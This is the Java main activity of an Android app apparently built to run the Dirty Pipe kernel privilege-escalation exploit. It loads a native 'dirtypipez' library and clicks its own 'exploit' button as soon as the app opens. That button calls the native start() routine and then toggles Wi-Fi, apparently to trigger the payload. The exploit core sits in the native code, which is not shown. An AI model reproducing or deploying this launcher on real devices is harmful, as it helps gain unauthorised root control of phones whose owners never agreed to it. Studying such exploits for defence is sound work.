package com.igio90.dirtypipez;

import android.app.Activity;
import android.content.Context;
import android.content.res.AssetManager;
import android.net.wifi.WifiManager;
import android.os.Bundle;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends Activity {

    static {
        System.loadLibrary("dirtypipez");
    }

    private File extractAsset(String name) {
        AssetManager assetManager = getAssets();

        InputStream in;
        OutputStream out;
        File dest = new File(getFilesDir().getParentFile(), name);

        try {
            in = assetManager.open(name);
            out = new FileOutputStream(dest);

            byte[] buffer = new byte[1024];
            int read;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
            in.close();
            out.flush();
            out.close();
        } catch (Exception ignored) {}

        return dest;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);

        findViewById(R.id.exploit).setOnClickListener(view -> {
            try {
                doExploit();
            } catch (Exception e) {
                e.printStackTrace();
            }
        });

        findViewById(R.id.exploit).callOnClick();
    }

    private void doExploit() {
        start();

        WifiManager wifiManager = (WifiManager) getApplicationContext()
                .getSystemService(Context.WIFI_SERVICE);
        wifiManager.setWifiEnabled(false);
        wifiManager.setWifiEnabled(true);
    }

    public native int start();
}